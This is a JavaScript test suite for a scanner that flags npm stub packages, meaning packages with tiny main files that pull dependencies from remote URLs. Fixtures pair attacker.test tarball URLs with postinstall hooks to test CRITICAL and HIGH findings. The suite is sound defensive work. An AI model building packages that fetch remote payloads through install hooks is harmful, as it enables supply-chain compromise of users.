const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, asyncTest, assert } = require('../test-utils');
const { scanStubPackage, analyzePackageDir, EXTERNAL_DEP_RE, STUB_BYTES_THRESHOLD } = require('../../src/scanner/stub-package.js');

async function runStubPackageTests() {
  console.log('\n=== STUB PACKAGE TESTS ===\n');

  function mkPkg(spec) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-stub-'));
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(spec.pkg, null, 2));
    if (spec.files) {
      for (const [rel, body] of Object.entries(spec.files)) {
        const full = path.join(dir, rel);
        fs.mkdirSync(path.dirname(full), { recursive: true });
        fs.writeFileSync(full, body);
      }
    }
    return dir;
  }
  function rmrf(dir) { try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ } }

  // ── EXTERNAL_DEP_RE patterns ──
  test('STUB: EXTERNAL_DEP_RE matches https URL', () => assert(EXTERNAL_DEP_RE.test('https://example.com/payload.tgz')));
  test('STUB: EXTERNAL_DEP_RE matches git+https URL', () => assert(EXTERNAL_DEP_RE.test('git+https://github.com/x/y.git')));
  test('STUB: EXTERNAL_DEP_RE matches github:user/repo shorthand', () => assert(EXTERNAL_DEP_RE.test('github:user/repo')));
  test('STUB: EXTERNAL_DEP_RE does NOT match local link:/workspace:/file: (those are LOCAL refs, not network pulls)', () => {
    assert(!EXTERNAL_DEP_RE.test('link:../local-pkg'));
    assert(!EXTERNAL_DEP_RE.test('workspace:*'));
    assert(!EXTERNAL_DEP_RE.test('file:./local-dir'));
  });
  test('STUB: EXTERNAL_DEP_RE does NOT match npm range', () => {
    assert(!EXTERNAL_DEP_RE.test('^1.0.0'));
    assert(!EXTERNAL_DEP_RE.test('~2.3.4'));
    assert(!EXTERNAL_DEP_RE.test('1.0.0'));
    assert(!EXTERNAL_DEP_RE.test('latest'));
  });

  // ── analyzePackageDir ──
  await asyncTest('STUB: clean lib (real main, npm deps) returns null', async () => {
    const dir = mkPkg({
      pkg: { name: 'real-lib', version: '1.0.0', main: 'index.js', dependencies: { 'lodash': '^4.17.0' } },
      files: { 'index.js': 'function add(a,b){return a+b;}\n'.repeat(50) }
    });
    try { assert(analyzePackageDir(dir) === null, 'real lib must return null'); }
    finally { rmrf(dir); }
  });

  await asyncTest('STUB: package with external dep + tiny main returns analysis', async () => {
    const dir = mkPkg({
      pkg: { name: 'ltidi-mock', version: '1.0.0', main: 'index.js',
             dependencies: { 'ltidisafe': 'https://attacker.test/ltidisafe.tgz' } },
      files: { 'index.js': 'module.exports = require("ltidisafe");' }
    });
    try {
      const r = analyzePackageDir(dir);
      assert(r !== null, 'must return analysis');
      assert(r.externals.length === 1, '1 external dep');
      assert(r.mainBytes < STUB_BYTES_THRESHOLD, 'main is below stub threshold');
    } finally { rmrf(dir); }
  });

  await asyncTest('STUB: scanner fires CRITICAL when lifecycle hook present', async () => {
    const dir = mkPkg({
      pkg: { name: 'ltidi-mock', version: '1.0.0', main: 'index.js',
             scripts: { postinstall: 'node index.js' },
             dependencies: { 'evil-payload': 'https://attacker.test/payload.tgz' } },
      files: { 'index.js': 'require("evil-payload");' }
    });
    try {
      const t = await scanStubPackage(dir);
      const crit = t.filter(x => x.type === 'stub_package_external_payload');
      assert(crit.length === 1, 'Should fire 1 CRITICAL, got ' + crit.length);
      assert(crit[0].severity === 'CRITICAL');
    } finally { rmrf(dir); }
  });

  await asyncTest('STUB: scanner fires HIGH when no lifecycle hook', async () => {
    const dir = mkPkg({
      pkg: { name: 'odd-stub', version: '1.0.0', main: 'index.js',
             dependencies: { 'pulled-from-url': 'git+https://example.com/x.git' } },
      files: { 'index.js': 'module.exports = require("pulled-from-url");' }
    });
    try {
      const t = await scanStubPackage(dir);
      const high = t.filter(x => x.type === 'stub_package_external_dep');
      const crit = t.filter(x => x.type === 'stub_package_external_payload');
      assert(crit.length === 0, 'No CRITICAL without lifecycle');
      assert(high.length === 1, 'Should fire 1 HIGH, got ' + high.length);
    } finally { rmrf(dir); }
  });

  await asyncTest('STUB: large main file with external dep does NOT fire (real wrapper lib)', async () => {
    const dir = mkPkg({
      pkg: { name: 'wrapper', version: '1.0.0', main: 'index.js',
             dependencies: { 'remote-thing': 'git+https://example.com/x.git' } },
      files: { 'index.js': 'function wrap(x){ return x + 1; }\n'.repeat(100) }
    });
    try {
      const t = await scanStubPackage(dir);
      assert(t.length === 0, 'Substantial main file = legitimate wrapper, got ' + t.length);
    } finally { rmrf(dir); }
  });

  await asyncTest('STUB: scanner walks node_modules dependencies', async () => {
    const dir = mkPkg({ pkg: { name: 'host', version: '1.0.0' } });
    const stubDep = path.join(dir, 'node_modules', 'evil-stub');
    fs.mkdirSync(stubDep, { recursive: true });
    fs.writeFileSync(path.join(stubDep, 'package.json'), JSON.stringify({
      name: 'evil-stub', version: '1.0.0', main: 'index.js',
      scripts: { postinstall: 'node index.js' },
      dependencies: { 'remote-pull': 'https://attacker.test/pull.tgz' }
    }));
    fs.writeFileSync(path.join(stubDep, 'index.js'), 'require("remote-pull");');
    try {
      const t = await scanStubPackage(dir);
      const crit = t.filter(x => x.type === 'stub_package_external_payload');
      assert(crit.length === 1, 'Should fire on stub dep inside node_modules, got ' + crit.length);
    } finally { rmrf(dir); }
  });

  await asyncTest('STUB: comments stripped before measuring main size', async () => {
    const longComment = '// '.repeat(200) + '\n/*' + 'x'.repeat(800) + '*/\n';
    const realCode = 'module.exports = 42;\n';
    const dir = mkPkg({
      pkg: { name: 'cmt-test', version: '1.0.0', main: 'index.js',
             dependencies: { x: 'https://e.test/x.tgz' } },
      files: { 'index.js': longComment + realCode }
    });
    try {
      const r = analyzePackageDir(dir);
      assert(r !== null, 'Comment-only padding should still classify as stub');
      assert(r.mainBytes < STUB_BYTES_THRESHOLD, 'meaningful size must exclude comments');
    } finally { rmrf(dir); }
  });

  await asyncTest('STUB: missing main file = treated as size 0 (full stub)', async () => {
    const dir = mkPkg({
      pkg: { name: 'no-main', version: '1.0.0',
             scripts: { install: 'echo' },
             dependencies: { x: 'https://e.test/x.tgz' } }
    });
    try {
      const t = await scanStubPackage(dir);
      const crit = t.filter(x => x.type === 'stub_package_external_payload');
      assert(crit.length === 1, 'No main + external dep + lifecycle = CRITICAL');
    } finally { rmrf(dir); }
  });
}

module.exports = { runStubPackageTests };
